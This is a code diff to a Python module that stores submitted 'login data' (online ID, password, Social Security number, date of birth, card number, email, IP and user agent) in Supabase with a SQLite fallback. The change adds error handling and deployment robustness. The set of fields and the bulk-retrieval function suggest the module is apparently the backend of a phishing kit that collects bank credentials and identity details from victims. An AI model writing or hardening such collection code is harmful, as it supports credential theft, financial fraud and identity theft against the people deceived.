@@ -18,10 +18,16 @@ except ImportError:
 SUPABASE_URL = os.getenv("SUPABASE_URL", "")
 SUPABASE_KEY = os.getenv("SUPABASE_ANON_KEY", "")
 
-# Fallback to SQLite
+# Fallback to SQLite (only for local development)
+sqlite_save = None
+sqlite_get_all = None
 if not SUPABASE_AVAILABLE or not SUPABASE_URL or not SUPABASE_KEY:
-    # Import SQLite fallback
-    from flow_control.login_data import save_login_data as sqlite_save, get_all_login_data as sqlite_get_all
+    try:
+        # Import SQLite fallback only if available
+        from flow_control.login_data import save_login_data as sqlite_save, get_all_login_data as sqlite_get_all
+    except ImportError:
+        # SQLite module not available (e.g., on Vercel without proper setup)
+        pass
 
 
 def get_supabase_client() -> Optional[Client]:
@@ -65,13 +71,26 @@ def save_login_data(
             return len(result.data) > 0
         except Exception as e:
             print(f"Supabase error: {e}")
-            # Fallback to SQLite if Supabase fails
-            if SUPABASE_AVAILABLE:
-                return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
+            import traceback
+            print(traceback.format_exc())
+            # Fallback to SQLite if available (local dev only)
+            if sqlite_save:
+                try:
+                    return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
+                except Exception as sqlite_error:
+                    print(f"SQLite fallback also failed: {sqlite_error}")
             return False
     else:
-        # Use SQLite fallback
-        return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
+        # Use SQLite fallback if available (local dev only)
+        if sqlite_save:
+            try:
+                return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
+            except Exception as e:
+                print(f"SQLite save failed: {e}")
+                return False
+        else:
+            print("ERROR: Supabase not configured and SQLite not available. Please configure SUPABASE_URL and SUPABASE_ANON_KEY environment variables.")
+            return False
 
 
 def get_all_login_data(limit: int = 100) -> List[Dict]:
